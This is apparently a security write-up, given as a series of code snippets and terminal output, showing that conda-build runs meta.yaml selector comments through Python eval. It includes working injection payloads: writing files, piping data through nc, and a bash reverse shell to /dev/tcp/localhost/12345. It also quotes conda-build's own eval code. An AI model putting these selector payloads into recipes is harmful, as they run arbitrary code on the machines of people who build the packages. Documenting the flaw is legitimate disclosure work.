["```\nbuild:\n  skip: True # [win] \n```", "```\n> source:\n>   url: http://path/to/unix/source # [not win]\n>   url: http://path/to/windows/source # [win] \n> ```", "```\n> source:\n>   url: http://path/to/windows/source # [win]\n>   url: http://path/to/python2/unix/source # [unix and py2k]\n>   url: http://path/to/python3/unix/source # [unix and py>=35] \n> ```", "```\nbuild:\n  skip: True # [win or py < 39] \n```", "```\n{% set name = \"simplejson\" %} {% set version = \"3.8.2\" %}   package:\n  name: {{ name|lower }}\n  version: {{ version }}   source:\n  url: https://pypi.io/packages/source/{{ name[0] }}/{{ name }}/{{ name }}-{{ version }}.tar.gz\n  sha256: 2b3a0c466fb4a1014ea131c2b8ea7c519f9278eba73d6fcb361b7bdb4fd494e9   build:\n  script: {{ PYTHON }} -m pip install . -vv\n  number: 0   requirements:\n  host:\n - python\n - pip\n  run:\n - python   test:\n  skip: True   about:\n  home: https://github.com/simplejson/simplejson\n  summary: 'Simple, fast, extensible JSON encoder/decoder for Python'\n  description: test\n  dev_url: https://github.com/simplejson/simplejson   extra:\n  recipe-maintainers:\n - ifd3f \n```", "```\nbuild:\n  skip: True # [open('/tmp/foo', 'w').write(\"nyaaaaaa\")] \n```", "```\n(base) [astrid@lab test]$ conda build . WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22 Adding in variants from internal_defaults Skipped: simplejson from /home/astrid/test defines build/skip for this configuration ({'target_platform': 'linux-64', 'python': '3.11'}).   <snip> \n```", "```\n(base) [astrid@lab test]$ cat /tmp/foo nyaaaaaa(base) [astrid@lab test]$ \n```", "```\n... source:\n  url: https://pypi.io/packages/source/{{ name[0] }}/{{ name }}/{{ name }}-{{ version }}.tar.gz\n  sha256: 2b3a0c466fb4a1014ea131c2b8ea7c519f9278eba73d6fcb361b7bdb4fd494e9   # [open('/tmp/foo2', 'w').write(\"nyaaaaaa\")]   build:\n  skip: True\n  script: {{ PYTHON }} -m pip install . -vv ... \n```", "```\n(base) [astrid@lab test]$ conda build . && cat /tmp/foo2 ... cat: /tmp/foo2: No such file or directory \n```", "```\nskip: True # [import os; os.system(\"echo test\")] \n```", "```\n(base) [astrid@lab test]$ conda build . WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22 Error: Invalid selector in meta.yaml line 14: offending line:\n skip: True # [import os; os.system(\"echo test\")] exception: invalid syntax (<string>, line 1) \n```", "```\nskip: True # [exec('''import os; os.system(\"sh -c 'echo shell moment > /tmp/asdf'\")''') or True] \n```", "```\n(base) [astrid@lab test]$ rm -f /tmp/asdf && conda build . && cat /tmp/asdf WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22   <snip>   Source and build intermediates have been left in /home/astrid/miniconda3/conda-bld. There are currently 3 accumulated. To remove them, you can run the ```", "``` command shell moment (base) [astrid@lab test]$ \n```", "```\nskip: True # [exec('''import os; os.system(\"sh -c 'echo netnya | nc localhost 12345'\")''') or True] \n```", "```\n(base) [astrid@lab test]$ nc -l localhost 12345 \n```", "```\n(base) [astrid@lab test]$ conda build . WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22 \n```", "```\n(base) [astrid@lab test]$ nc -l localhost 12345 netnya \n```", "```\n(base) [astrid@lab test]$ conda build . WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22 asdfasdf \n```", "```\nskip: True # [exec('''import os; os.system(\"bash -c 'bash -i >& /dev/tcp/localhost/12345  0>&1'\")''') or True] \n```", "```\n# We evaluate the selector and return True (keep this line) or False (drop this line) # If we encounter a NameError (unknown variable in selector), then we replace it by False and #     re-run the evaluation def eval_selector(selector_string, namespace, variants_in_place):\n  try:\n  # TODO: is there a way to do this without eval?  Eval allows arbitrary\n  #    code execution.\n  return eval(selector_string, namespace, {})\n  except NameError as e:\n  ... \n```", "```\ndef select_lines(data, namespace):\n  ...    try:\n  # TODO: is there a way to do this without eval?  Eval allows arbitrary\n  #    code execution.\n  if eval(cond, namespace, {}):\n lines.append(m.group(1) + trailing_quote)\n  except:\n  ... \n```"]